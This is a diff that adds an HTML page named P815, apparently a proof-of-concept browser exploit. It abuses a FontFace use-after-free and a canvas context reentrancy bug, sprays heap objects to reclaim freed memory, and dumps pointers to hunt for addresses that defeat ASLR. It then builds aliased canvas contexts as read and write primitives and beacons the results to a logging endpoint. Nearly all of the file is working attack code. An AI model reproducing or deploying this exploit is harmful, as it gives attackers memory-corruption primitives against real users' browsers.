@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P815</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;} .fail{color:#f85149;} .info{color:#58a6ff;} .hot{color:#ffa657;}
+</style>
+</head><body>
+<pre id="o">P815: Full FontFace 192B dump + ASLR code pointer hunt</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+
+var _bq=[];
+function bn(t,d){_bq.push([t,d||'']);}
+function flushBn(){
+  for(var i=0;i<_bq.length;i++){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/beacon.php?tag=P815-'+encodeURIComponent(_bq[i][0])+'&data='+encodeURIComponent(String(_bq[i][1]).slice(0,900))+'&t='+Date.now(),false);
+      x.send();
+    }catch(e){}
+  }
+  _bq=[];
+}
+function imgBn(t){var i=new Image();i.src='/beacon.php?tag=P815-'+t+'&t='+Date.now();}
+
+function hex64(bu,i){return '0x'+('0000000000000000'+bu[i].toString(16)).slice(-16);}
+function hexU32(v){return '0x'+('00000000'+v.toString(16)).slice(-8);}
+
+/* ========== PHASE 1: FontFace UAF — FULL 192B DUMP ========== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  /* Find best reclaimed AB */
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    imgBn('FONT-MISS');
+    log('FontFace reclaim missed — reloading','fail');
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+
+  imgBn('FONT-HIT_nz='+bestNz);
+  log('FontFace reclaimed: AB['+bestI+'] nz='+bestNz+'/192 bytes','ok');
+
+  /* ---- FULL 192B DUMP: all 24 qwords via BigUint64Array ---- */
+  var bu=new BigUint64Array(fabs[bestI]);
+  var dv=new DataView(fabs[bestI]);
+
+  var codeHits=[], heapHits=[], otherHits=[], dumpLines=[];
+
+  for(var q=0;q<24;q++){
+    var off=q*8;
+    var lo=dv.getUint32(off,true);
+    var hi=dv.getUint32(off+4,true);
+    var raw=hex64(bu,q);
+
+    /* Classify */
+    var cls='zero';
+    if(hi===0&&lo===0){cls='zero';}
+    else if(hi>=0xFFFF8000){cls='KERNEL';}
+    else if(hi===0xFFFFFFFF){cls='sentinel';}
+    else if(hi>=0x0001&&hi<=0x00FF){cls='HEAP';}
+    else if(hi===0&&lo>0&&lo<=0xFFFF){cls='small';}
+    else if(hi===0&&lo>0xFFFF){cls='lo32:'+hexU32(lo);}
+    else{cls='other:'+hexU32(hi)+':'+hexU32(lo);}
+
+    var line='q'+q+' +'+hexU32(off)+': '+raw+' ['+cls+']';
+    dumpLines.push(line);
+
+    if(cls==='HEAP') heapHits.push(q);
+    else if(cls==='KERNEL') codeHits.push('KERN_q'+q);
+    else if(cls!=='zero'&&cls!=='small'&&cls!=='sentinel') otherHits.push(q);
+
+    /* Log nonzero */
+    if(hi!==0||lo!==0){
+      var col = cls==='HEAP'?'info':
+                cls.indexOf('KERN')===0?'hot':
+                cls==='small'?'':'hot';
+      log(line, col);
+    }
+  }
+
+  /* Compute H from q11 */
+  var q11lo=dv.getUint32(0x58,true);
+  var q11hi=dv.getUint32(0x5C,true);
+  var Hstr='(no q11)';
+  if(q11hi!==0){
+    var borrow=(q11lo<0x68)?1:0;
+    var H_hi=q11hi-borrow, H_lo=(q11lo-0x68)>>>0;
+    Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
+  }
+
+  /* Also read q13 */
+  var q13lo=dv.getUint32(0x68,true);
+  var q13hi=dv.getUint32(0x6C,true);
+  var q13str=hex64(bu,13);
+
+  log('','');
+  log('H (self_addr from q11) = '+Hstr,'ok');
+  log('q13 raw = '+q13str,'info');
+  log('Nonzero qwords: '+(heapHits.length+otherHits.length+codeHits.length)+'/24','info');
+  log('  HEAP: q['+heapHits.join(',')+']','info');
+  log('  OTHER: q['+otherHits.join(',')+']','hot');
+  log('  KERNEL: '+codeHits.join(','),'hot');
+
+  /* Beacon full dump in 3 parts */
+  bn('DUMP-A',dumpLines.slice(0,8).join('|'));
+  bn('DUMP-B',dumpLines.slice(8,16).join('|'));
+  bn('DUMP-C',dumpLines.slice(16,24).join('|'));
+  bn('H',Hstr);
+  bn('SUMMARY','nz='+bestNz+'|heap='+heapHits.length+'|other='+otherHits.length+'|kern='+codeHits.length);
+
+  /* ---- Also dump byte-level for nonzero regions ---- */
+  var u8=new Uint8Array(fabs[bestI]);
+  var byteRanges=[];
+  for(var r=0;r<192;r+=8){
+    var any=false;
+    for(var b=0;b<8;b++)if(u8[r+b]!==0){any=true;break;}
+    if(any){
+      var hex='';
+      for(var b=0;b<8;b++)hex+=('0'+u8[r+b].toString(16)).slice(-2);
+      byteRanges.push('+'+r.toString(16)+':'+hex);
+    }
+  }
+  bn('BYTES',byteRanges.join('|'));
+  log('','');
+  log('Raw byte ranges: '+byteRanges.join(' '),'info');
+
+  /* ========== PHASE 2: Same-type alias + fillStyle ========== */
+  var innerCtx=null;
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{
+    get:function(){
+      innerCtx=canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer',opts);
+
+  if(innerCtx){
+    var SPRAY=300;
+    var ctxs=[],cans=[];
+    for(var i=0;i<SPRAY;i++){
+      var c=document.createElement('canvas');
+      c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=5000+i;
+      ctxs.push(ctx);cans.push(c);
+    }
+    var slw;
+    try{slw=innerCtx.lineWidth;}catch(e){slw=-999;}
+    if(slw>=5000&&slw<5000+SPRAY){
+      var aidx=Math.round(slw-5000);
+      var stale=innerCtx, live=ctxs[aidx];
+      bn('ALIAS','idx='+aidx);
+      log('','');
+      log('Same-type alias OK idx='+aidx,'ok');
+
+      /* fillStyle byte channel — encode pointer bytes as rgba */
+      /* Test: can we READ the H bytes through fillStyle? */
+      /* H has hi and lo parts. Encode lo bytes as rgba(b0,b1,b2,b3/255) */
+      if(q11hi!==0){
+        var hb0=H_lo&0xFF, hb1=(H_lo>>>8)&0xFF, hb2=(H_lo>>>16)&0xFF, hb3=(H_lo>>>24)&0xFF;
+        live.fillStyle='rgba('+hb0+','+hb1+','+hb2+','+(hb3/255).toFixed(3)+')';
+        var readback=stale.fillStyle;
+        bn('FS-HTEST','set=rgba('+hb0+','+hb1+','+hb2+','+(hb3/255).toFixed(3)+')|got='+readback);
+        log('fillStyle H-bytes test: '+readback,'info');
+
+        /* Also encode hi bytes */
+        var hhb0=H_hi&0xFF, hhb1=(H_hi>>>8)&0xFF;
+        live.strokeStyle='rgba('+hhb0+','+hhb1+',0,1)';
+        var ssRead=stale.strokeStyle;
+        bn('SS-HTEST','set=rgba('+hhb0+','+hhb1+',0,1)|got='+ssRead);
+        log('strokeStyle H-hi test: '+ssRead,'info');
+      }
+
+      /* KEY TEST: try setLineDash with large array, then use alias to
+         read the heap buffer address through a side channel */
+      var dashSize=96;  /* 96 doubles = 768 bytes = exact Canvas2D context size */
+      var dashArr=[];
+      for(var d=0;d<dashSize;d++)dashArr.push(1000+d);
+      live.setLineDash(dashArr);
+      var gotDash=stale.getLineDash();
+      bn('DASH','set='+dashSize+'|got='+gotDash.length+'|ok='+(gotDash.length===dashSize));
+      log('setLineDash('+dashSize+'): got '+gotDash.length+' back','info');
+
+      /* Can we see anything interesting in getLineDash values? */
+      /* After Canvas UAF + reclaim, the lineDash buffer might overlap with
+         freed memory if we free/reclaim at the right time */
+
+      /* Test: Transform matrix - 6 doubles at State+112 */
+      /* These are NOT DAZ'd for normal-range values */
+      live.setTransform(1.1,2.2,3.3,4.4,5.5,6.6);
+      var tf=stale.getTransform();
+      bn('TF','a='+tf.a+'|ok='+(tf.a===1.1));
+
+      /* Test: globalAlpha — single double at State+0 */
+      live.globalAlpha=0.123456789;
+      var ga=stale.globalAlpha;
+      bn('GA','set=0.123456789|got='+ga+'|match='+(ga===0.123456789));
+      log('globalAlpha: '+(ga===0.123456789?'EXACT':'DIFFER='+ga),'info');
+
+    }else{
+      bn('ALIAS-MISS','lw='+slw);
+      log('Same-type reclaim missed (lw='+slw+')','fail');
+    }
+  }else{
+    bn('UAF-FAIL','');
+    log('Canvas UAF failed','fail');
+  }
+
+  bn('DONE','ok');
+  flushBn();
+  log('','');
+  log('=== P815 COMPLETE ===','ok');
+
+},600);
+</script></body></html>
